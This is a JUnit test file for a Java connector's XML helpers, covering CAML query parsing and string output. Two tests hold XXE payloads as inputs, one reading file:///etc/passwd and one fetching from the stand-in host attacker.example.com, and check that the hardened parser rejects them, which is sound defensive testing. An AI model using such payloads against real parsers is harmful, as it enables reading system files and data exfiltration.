package connector;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for the XML utility methods of {@link Manager}:
 * {@link Manager#generateXmlNode(String)} and {@link Manager#xmlToString(Document)}.
 *
 * These methods have no network dependency and are fully testable in isolation.
 */
class ManagerXmlTest {

    // -----------------------------------------------------------------------
    // generateXmlNode — happy path
    // -----------------------------------------------------------------------

    @Test
    void generateXmlNodeReturnsRootElement() throws Exception {
        String xml = "<Query><Where><Eq><FieldRef Name='ID'/></Eq></Where></Query>";
        Node node = Manager.generateXmlNode(xml);

        assertNotNull(node);
        assertEquals("Query", node.getNodeName());
    }

    @Test
    void generateXmlNodePreservesChildStructure() throws Exception {
        String xml = "<Root><Child/></Root>";
        Node node = Manager.generateXmlNode(xml);

        assertEquals("Root", node.getNodeName());
        assertTrue(node.hasChildNodes());
        assertEquals("Child", node.getFirstChild().getNodeName());
    }

    @Test
    void generateXmlNodePreservesAttributes() throws Exception {
        String xml = "<FieldRef Name='Title' Ascending='True'/>";
        Node node = Manager.generateXmlNode(xml);

        Element elem = (Element) node;
        assertEquals("Title", elem.getAttribute("Name"));
        assertEquals("True", elem.getAttribute("Ascending"));
    }

    @Test
    void generateXmlNodeHandlesSharePointCamlQuery() throws Exception {
        String caml = "<Query><OrderBy><FieldRef Name='ID' Ascending='False'/></OrderBy></Query>";
        Node node = Manager.generateXmlNode(caml);

        assertNotNull(node);
        assertEquals("Query", node.getNodeName());
    }

    // -----------------------------------------------------------------------
    // generateXmlNode — XXE protection
    // -----------------------------------------------------------------------

    @Test
    void generateXmlNodeBlocksXxeDoctypeDeclaration() {
        // An XXE payload that would exfiltrate /etc/passwd on an unprotected parser
        String xxe = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                + "<Root>&xxe;</Root>";

        // The XXE-hardened parser must reject this — any exception is acceptable
        assertThrows(Exception.class, () -> Manager.generateXmlNode(xxe));
    }

    @Test
    void generateXmlNodeBlocksExternalGeneralEntity() {
        String xxe = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE root [<!ENTITY ext SYSTEM \"http://attacker.example.com/evil\">]>"
                + "<root>&ext;</root>";

        assertThrows(Exception.class, () -> Manager.generateXmlNode(xxe));
    }

    // -----------------------------------------------------------------------
    // xmlToString — structure and content
    // -----------------------------------------------------------------------

    @Test
    void xmlToStringContainsStartAndEndMarkers() throws Exception {
        Document doc = emptyDoc("Root");
        String result = Manager.xmlToString(doc);

        assertTrue(result.contains("---------------- XML START ----------------"),
                "Output must contain the XML START marker");
        assertTrue(result.contains("---------------- XML END ----------------"),
                "Output must contain the XML END marker");
    }

    @Test
    void xmlToStringContainsRootElementName() throws Exception {
        Document doc = emptyDoc("TestRoot");
        String result = Manager.xmlToString(doc);

        assertTrue(result.contains("TestRoot"), "Output must include the root element name");
    }

    @Test
    void xmlToStringStartsWithNewlineAndStartMarker() throws Exception {
        Document doc = emptyDoc("Root");
        String result = Manager.xmlToString(doc);

        assertTrue(result.startsWith("\n---------------- XML START ----------------\n"));
    }

    @Test
    void xmlToStringEndsWithEndMarker() throws Exception {
        Document doc = emptyDoc("Root");
        String result = Manager.xmlToString(doc);

        assertTrue(result.endsWith("---------------- XML END ----------------\n"));
    }

    @Test
    void xmlToStringPreservesChildElements() throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.newDocument();
        Element root = doc.createElement("Lists");
        Element child = doc.createElement("List");
        child.setAttribute("Name", "MyList");
        root.appendChild(child);
        doc.appendChild(root);

        String result = Manager.xmlToString(doc);

        assertTrue(result.contains("Lists"));
        assertTrue(result.contains("List"));
        assertTrue(result.contains("MyList"));
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    private static Document emptyDoc(String rootName) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.newDocument();
        doc.appendChild(doc.createElement(rootName));
        return doc;
    }
}
